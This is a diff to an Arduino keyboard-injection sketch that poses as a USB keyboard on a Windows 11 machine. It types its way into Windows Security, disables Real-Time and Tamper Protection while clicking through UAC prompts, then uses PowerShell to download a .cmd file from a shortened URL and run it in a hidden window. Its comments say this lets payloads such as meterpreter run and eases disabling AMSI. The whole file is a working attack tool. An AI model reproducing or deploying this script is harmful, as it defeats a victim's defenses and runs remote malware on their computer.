@@ -1,10 +1,8 @@
 #include "Keyboard.h"
 /*
-This script is specifically designed for Windows 11. It disables "Real Time Protection" as well as "Tamper Protection" AND
-will click through any UAC prompts in the process. Please note, with Arduino there is no way to capture the state of Real Time 
-Protection, and therefore if it is already off, it will essentially reenable it. The delays can be tweaked to suit your needs
-depending on the hardware of the target computer. Once Windows Security is manually disabled, It also downloads and executes
-a file/stager from the web via powershell.
+This script was originally created by Nicholas Noussias to disable Real-Time Protection and Tamper Protection in Windows 11 Security settings. 
+
+Once both are disabled, even known payloads such as meterpreter can be downloaded/executed without issue and further scripts/methods of permanently disabling security features such as AMSI will be much easier
 */
 void typeKey(uint8_t key)
 {
@@ -26,28 +24,28 @@ void setup()
   Keyboard.press(KEY_ESC);
   Keyboard.releaseAll();
 
- delay(125);
+ delay(350);
   Keyboard.print(F("virus & threat protection"));
 
- delay(2000);
+ delay(1250);
   typeKey(KEY_RETURN);
 
- delay(125);
+ delay(225);
   typeKey(KEY_TAB);
 
- delay(125);
+ delay(225);
   typeKey(KEY_TAB);
 
- delay(125);
+ delay(225);
   typeKey(KEY_TAB);
 
- delay(125);
+ delay(225);
   typeKey(KEY_TAB);
 
- delay(125);
+ delay(225);
   typeKey(KEY_RETURN);
 
- delay(125);
+ delay(225);
   typeKey(' ');
 
  delay(250);
@@ -55,19 +53,19 @@ void setup()
   Keyboard.press('y');
   Keyboard.releaseAll();
 
- delay(125);
+ delay(225);
   typeKey(KEY_TAB);
 
- delay(125);
+ delay(225);
   typeKey(KEY_TAB);
 
- delay(125);
+ delay(225);
   typeKey(KEY_TAB);
 
- delay(125);
+ delay(225);
   typeKey(KEY_TAB);
 
- delay(125);
+ delay(225);
   typeKey(' ');
 
 delay(250);
@@ -77,7 +75,9 @@ delay(250);
 
   Keyboard.press(KEY_ESC);
   Keyboard.releaseAll();
- 
+
+  //Open PowerShell to download payload
+  
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_ESC);
   Keyboard.releaseAll(); 
@@ -88,12 +88,12 @@ delay(250);
  delay(50);
   typeKey(KEY_RETURN);
 
-delay(2000);
+  delay(1250);
   Keyboard.print(F("powershell -c Invoke-WebRequest -Uri 'https://shorturl.at/JPSU4' -OutFile 'download.cmd'"));
- delay(1500); 
+ delay(1500); //Delay may need adjusted depending on filesize to ensure download has finished before attempting to execute
   typeKey(KEY_RETURN);
 delay(2000);
-  Keyboard.print(F("powershell -c Start-Process ./download.cmd -WindowStyle hidden"));
+  Keyboard.print(F("powershell -c Start-Process ./download.cmd -WindowStyle hidden")); //Execute downloaded payload in a hidden window
   typeKey(KEY_RETURN);
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4);
